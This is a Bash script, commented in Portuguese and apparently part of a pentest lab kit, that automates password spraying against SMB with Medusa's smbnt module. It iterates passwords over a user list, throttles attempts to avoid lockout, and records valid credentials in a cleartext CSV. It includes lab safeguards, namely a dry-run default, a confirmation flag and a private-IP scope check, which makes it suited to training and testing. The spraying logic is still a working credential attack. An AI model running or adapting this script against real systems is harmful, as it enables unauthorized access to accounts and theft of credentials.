#!/usr/bin/env bash
# =============================================================================
# smb_spray.sh - Password spraying em SMB com Medusa (modulo smbnt)
# =============================================================================
# Diferenca em relacao a forca bruta tradicional:
#
#   Forca bruta  -> para CADA usuario, testa TODAS as senhas (gerando
#                   muitos logins falhos por conta = alto risco de lockout)
#   Spraying     -> para CADA senha, testa TODOS os usuarios (poucas
#                   tentativas por conta = menor risco de bloqueio)
#
# Este script implementa a logica de spraying: o laco externo e a SENHA
# e o laco interno sao os USUARIOS, chamando o Medusa com -p <senha> e
# -U <arquivo de usuarios>.
#
# Uso:
#   ./scripts/smb_spray.sh --alvo 192.168.56.101
#   ./scripts/smb_spray.sh --alvo 192.168.56.101 --confirmo-lab
#   ./scripts/smb_spray.sh --alvo 192.168.56.101 --dominio LAB --confirmo-lab -v
#
# Sem --confirmo-lab o script apenas mostra o plano (dry-run).
# =============================================================================

set -u -o pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib_lab.sh
source "$SCRIPT_DIR/lib_lab.sh"

ALVO=""
DOMINIO=""
USUARIOS=""
SENHAS=""
THREADS=2          # baixo de proposito: spraying agressivo derruba o alvo
PAUSA=2            # segundos entre senhas (evita lockout e ruido)
VERBOSE=0
SAIDA=""
CONFIRMADO=0

uso() {
  cat <<'TXT'
Uso: smb_spray.sh --alvo <IP_PRIVADO> [opcoes]

Opcoes:
  -a, --alvo <IP>        IP da VM alvo (privado). Obrigatorio.
  -U, --usuarios <file>  Lista de usuarios (padrao: wordlists/usuarios-smb.txt)
  -P, --senhas <file>    Lista de senhas   (padrao: wordlists/senhas-spray.txt)
  -d, --dominio <nome>   Dominio/NETBIOS (padrao: vazio = WORKGROUP)
  -t, --threads <n>      Logins concorrentes por senha (padrao: 2)
  -w, --pausa <seg>      Segundos entre senhas (padrao: 2)
  -o, --saida <dir>      Diretorio de saida (padrao: logs/<data>-smb-spray)
  -v, --verbose          Medusa com -v 4 e echo dos comandos
      --confirmo-lab     Executa de verdade contra a VM
  -h, --help             Esta ajuda

Exemplos:
  ./scripts/smb_spray.sh --alvo 192.168.56.101
  ./scripts/smb_spray.sh --alvo 192.168.56.101 --dominio LAB --confirmo-lab
TXT
}

# --- Argumentos --------------------------------------------------------------
while (( $# > 0 )); do
  case "$1" in
    -a|--alvo)      ALVO="${2:-}"; shift 2 ;;
    -U|--usuarios)  USUARIOS="${2:-}"; shift 2 ;;
    -P|--senhas)    SENHAS="${2:-}"; shift 2 ;;
    -d|--dominio)   DOMINIO="${2:-}"; shift 2 ;;
    -t|--threads)   THREADS="${2:-2}"; shift 2 ;;
    -w|--pausa)     PAUSA="${2:-2}"; shift 2 ;;
    -o|--saida)     SAIDA="${2:-}"; shift 2 ;;
    -v|--verbose)   VERBOSE=1; shift ;;
    --confirmo-lab) CONFIRMADO=1; shift ;;
    -h|--help)      uso; exit 0 ;;
    *) die "Opcao desconhecida: $1 (use --help)" ;;
  esac
done

RAIZ="$(lab_raiz_repo)"
[[ -n "$USUARIOS" ]] || USUARIOS="$RAIZ/wordlists/usuarios-smb.txt"
[[ -n "$SENHAS" ]]   || SENHAS="$RAIZ/wordlists/senhas-spray.txt"

[[ -n "$ALVO" ]] || { uso; die "Informe --alvo <IP da VM alvo>."; }
[[ -f "$USUARIOS" ]] || die "Arquivo de usuarios nao encontrado: $USUARIOS"
[[ -f "$SENHAS" ]]   || die "Arquivo de senhas nao encontrado: $SENHAS"
[[ "$THREADS" =~ ^[0-9]+$ ]] || die "--threads deve ser numero inteiro."
[[ "$PAUSA" =~ ^[0-9]+$ ]]   || die "--pausa deve ser numero inteiro."

ALVO_IP="$(lab_validar_alvo "$ALVO")" || die "Alvo recusado pela guarda de escopo."

# --- Leitura das listas (ignora comentarios e linhas vazias) -----------------
mapfile -t LISTA_USUARIOS < <(grep -vE '^[[:space:]]*(#|$)' -- "$USUARIOS" | sed 's/[[:space:]]*$//')
mapfile -t LISTA_SENHAS   < <(grep -vE '^[[:space:]]*(#|$)' -- "$SENHAS"   | sed 's/[[:space:]]*$//')

(( ${#LISTA_USUARIOS[@]} > 0 )) || die "Lista de usuarios vazia: $USUARIOS"
(( ${#LISTA_SENHAS[@]} > 0 ))   || die "Lista de senhas vazia: $SENHAS"

# --- Plano (dry-run) ---------------------------------------------------------
# IMPORTANTE: nada e criado em logs/ antes da confirmacao explicita.
lab_cabecalho "PASSWORD SPRAYING SMB (medusa -M smbnt)"

echo "Alvo        : $ALVO_IP"
echo "Dominio     : ${DOMINIO:-<vazio / WORKGROUP>}"
echo "Usuarios    : ${#LISTA_USUARIOS[@]} (${USUARIOS})"
echo "Senhas      : ${#LISTA_SENHAS[@]} (${SENHAS})"
echo "Threads     : $THREADS"
echo "Pausa       : ${PAUSA}s entre senhas"
echo "Tentativas  : $(( ${#LISTA_USUARIOS[@]} * ${#LISTA_SENHAS[@]} )) logins no total"
echo "Saida       : $SAIDA"
echo

if (( ! CONFIRMADO )); then
  lab_mensagem_modo_seguro
  echo "PLANO (dry-run) - comandos que seriam executados:"
  echo
  for senha in "${LISTA_SENHAS[@]}"; do
    printf "  medusa -h %s -U %s -p '%s' -M smbnt -t %s%s%s\n" \
      "$ALVO_IP" "$USUARIOS" "$senha" "$THREADS" \
      "${DOMINIO:+ -m GROUP:$DOMINIO}" ""
  done
  echo
  log_info "Nada foi enviado ao alvo. Repita com --confirmo-lab para executar."
  exit 0
fi

# --- Diretorio de saida (somente no modo real) -------------------------------
if [[ -z "$SAIDA" ]]; then
  SAIDA="$(lab_dir_saida smb-spray)"
fi
mkdir -p -- "$SAIDA"

LOG_GERAL="$SAIDA/spray.log"
CSV="$SAIDA/achados.csv"
[[ -f "$CSV" ]] || echo "data_hora,senha,usuario,ip" > "$CSV"

exec > >(tee -a -- "$LOG_GERAL") 2>&1

# --- Pre-requisitos ----------------------------------------------------------
exigir_medusa || die "Medusa nao instalado."
if ! lab_tem_modulo smbnt; then
  die "Modulo smbnt ausente no Medusa. Reinstale: sudo apt install --reinstall medusa"
fi

# --- Execucao ----------------------------------------------------------------
FALHA_TOTAL=0
TOTAL_ACHADOS=0
INDICE=0

# Arquivo de usuarios filtrado (sem comentarios), usado pelo -U
USUARIOS_LIMPO="$SAIDA/usuarios-limpo.txt"
printf '%s\n' "${LISTA_USUARIOS[@]}" > "$USUARIOS_LIMPO"

for senha in "${LISTA_SENHAS[@]}"; do
  INDICE=$(( INDICE + 1 ))
  echo "================================================================="
  echo "[$INDICE/${#LISTA_SENHAS[@]}] Senha testada contra ${#LISTA_USUARIOS[@]} usuarios: '$senha'"
  echo "================================================================="

  args=(
    -h "$ALVO_IP"
    -U "$USUARIOS_LIMPO"
    -p "$senha"
    -M smbnt
    -t "$THREADS"
    -O "$SAIDA/medusa-senha-$INDICE.txt"
  )
  [[ -n "$DOMINIO" ]] && args+=( -m "GROUP:$DOMINIO" )
  (( VERBOSE )) && args+=( -v 4 )

  (( VERBOSE )) && echo "+ medusa ${args[*]}"

  saida_medusa="$(medusa "${args[@]}" 2>&1)"
  status=$?
  printf '%s\n' "$saida_medusa"

  if (( status != 0 )); then
    log_aviso "Medusa retornou codigo $status na senha '$senha' (veja a saida acima)."
  fi

  # Medusa marca logins validos com SUCCESS / ACCOUNT FOUND
  while IFS= read -r linha_sucesso; do
    [[ -z "$linha_sucesso" ]] && continue
    TOTAL_ACHADOS=$(( TOTAL_ACHADOS + 1 ))
    usuario_ok="$(sed -nE 's/.*User:[[:space:]]*([^[:space:]]+).*/\1/p' <<< "$linha_sucesso")"
    [[ -z "$usuario_ok" ]] && usuario_ok="?"
    log_ok "CREDENCIAL VALIDA -> usuario='$usuario_ok' senha='$senha'"
    printf '%s,%s,%s,%s\n' \
      "$(date '+%Y-%m-%d %H:%M:%S')" "$senha" "$usuario_ok" "$ALVO_IP" >> "$CSV"
  done < <(grep -iE 'SUCCESS|ACCOUNT FOUND' <<< "$saida_medusa" || true)

  if (( INDICE < ${#LISTA_SENHAS[@]} )) && (( PAUSA > 0 )); then
    echo "... pausa de ${PAUSA}s (evita lockout e reduz ruido) ..."
    sleep "$PAUSA"
  fi
done

# --- Resumo ------------------------------------------------------------------
echo
echo "================================================================="
echo " RESUMO"
echo "================================================================="
echo " Senhas testadas    : ${#LISTA_SENHAS[@]}"
echo " Usuarios por senha : ${#LISTA_USUARIOS[@]}"
echo " Credenciais validas: $TOTAL_ACHADOS"
echo " Log completo       : $LOG_GERAL"
echo " Achados (CSV)      : $CSV"
echo "================================================================="
(( TOTAL_ACHADOS > 0 )) && log_ok "Spraying encontrou $TOTAL_ACHADOS credencial(is) valida(s)."
(( TOTAL_ACHADOS == 0 )) && log_info "Nenhuma credencial valida nesta rodada (o que tambem e um resultado valido)."

log_aviso "Apague ou proteja $CSV: ele contem credenciais em texto claro."
exit 0
